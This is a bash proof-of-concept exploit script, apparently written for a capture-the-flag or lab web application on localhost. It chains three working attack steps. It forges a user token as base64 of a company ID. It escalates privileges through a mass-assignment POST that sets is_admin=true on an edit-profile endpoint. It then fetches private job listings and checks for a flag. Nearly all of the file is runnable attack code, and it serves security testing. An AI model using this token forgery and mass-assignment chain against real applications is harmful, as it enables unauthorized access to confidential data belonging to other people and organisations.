#!/bin/bash

# POC: Privilege Escalation Leading to Unauthorized Access to Private Resources
# Demonstrates the exploit chain: token forgery → privilege escalation → private resource access

TARGET_URL="http://localhost:8080"
COMPANY_ID="1"

echo "[*] Starting Privilege Escalation POC for Private Resource Access"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Get initial token (base64 encoded company ID)
echo "[Step 1] Obtaining user token for company $COMPANY_ID"
TOKEN="Bearer MQ=="  # base64("1")
echo "[+] Token obtained: $TOKEN"
echo ""

# Step 2: Check initial access to jobs (should only show public jobs)
echo "[Step 2] Accessing /company/$COMPANY_ID/jobs as non-admin user"
echo "[*] Request: GET /company/$COMPANY_ID/jobs"
INITIAL_RESPONSE=$(curl -s -H "Cookie: user_token=$TOKEN" "$TARGET_URL/company/$COMPANY_ID/jobs")
echo "[+] Initial Response (Non-Admin):"
echo "$INITIAL_RESPONSE"
echo ""

# Count jobs in initial response
INITIAL_JOB_COUNT=$(echo "$INITIAL_RESPONSE" | grep -o "name" | wc -l)
echo "[+] Initial job count (public only): $INITIAL_JOB_COUNT"

# Check if private job (FLAG) is visible initially
if echo "$INITIAL_RESPONSE" | grep -q "FLAG\|secret"; then
    echo "[!] WARNING: Private resources already visible (unexpected)"
else
    echo "[+] Private resources NOT visible initially (expected)"
fi
echo ""

# Step 3: Escalate privileges via mass assignment
echo "[Step 3] Escalating privileges via mass assignment vulnerability"
echo "[*] Request: POST /edit_profile/$COMPANY_ID with is_admin=true"
ESCALATION_RESPONSE=$(curl -s -X POST \
    -H "Cookie: user_token=$TOKEN" \
    -d "name=demo&is_admin=true" \
    "$TARGET_URL/edit_profile/$COMPANY_ID")
echo "[+] Escalation Response:"
echo "$ESCALATION_RESPONSE"
echo ""

# Step 4: Access jobs again - should now show private jobs
echo "[Step 4] Accessing /company/$COMPANY_ID/jobs after privilege escalation"
echo "[*] Request: GET /company/$COMPANY_ID/jobs (as now-admin user)"
ESCALATED_RESPONSE=$(curl -s -H "Cookie: user_token=$TOKEN" "$TARGET_URL/company/$COMPANY_ID/jobs")
echo "[+] Response After Escalation (Admin):"
echo "$ESCALATED_RESPONSE"
echo ""

# Count jobs after escalation
ESCALATED_JOB_COUNT=$(echo "$ESCALATED_RESPONSE" | grep -o "name" | wc -l)
echo "[+] Job count after escalation: $ESCALATED_JOB_COUNT"

# Check if private job (FLAG) is now visible
if echo "$ESCALATED_RESPONSE" | grep -q "FLAG\|secret"; then
    echo "[!!!] VULNERABILITY CONFIRMED: Private resources now visible after privilege escalation!"
    echo "[!!!] Private/secret data access successfully demonstrated"
    EXPLOIT_SUCCESS=1
else
    echo "[!] Private resources still not visible (unexpected)"
    EXPLOIT_SUCCESS=0
fi
echo ""

# Step 5: Comparison
echo "[Step 5] Vulnerability Analysis"
echo "========================================"
echo "Initial Request (Non-Admin):  $INITIAL_JOB_COUNT jobs returned"
echo "After Escalation (Admin):     $ESCALATED_JOB_COUNT jobs returned"
echo ""
if [ $ESCALATED_JOB_COUNT -gt $INITIAL_JOB_COUNT ]; then
    echo "[!!!] CRITICAL: More jobs visible after privilege escalation!"
    echo "[!!!] This confirms that private resources are conditionally exposed based on admin status"
    echo "[!!!] An attacker can view confidential job listings and other private data"
    exit 0
else
    echo "[+] Job counts are equal (checking for private resource indicators)"
    if [ $EXPLOIT_SUCCESS -eq 1 ]; then
        echo "[!!!] CRITICAL: Private resource indicators (FLAG/secret) found!"
        exit 0
    fi
fi